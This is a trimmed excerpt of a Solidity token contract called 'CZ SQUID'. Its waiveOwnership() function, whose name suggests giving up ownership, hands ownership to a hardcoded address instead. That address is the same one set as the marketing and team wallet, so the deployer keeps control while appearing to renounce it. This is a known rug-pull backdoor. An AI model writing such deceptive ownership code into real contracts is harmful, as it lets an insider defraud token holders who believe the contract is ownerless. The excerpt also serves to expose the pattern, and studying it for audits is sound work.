...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x24c86c2A586FC098D7589c7474819e64be041CAA);
    }
...
contract CZSQUID is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CZ SQUID";
    string private _symbol = "CZSQUID";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x24c86c2A586FC098D7589c7474819e64be041CAA);
    address payable private teamWalletAddress = payable(0x24c86c2A586FC098D7589c7474819e64be041CAA);
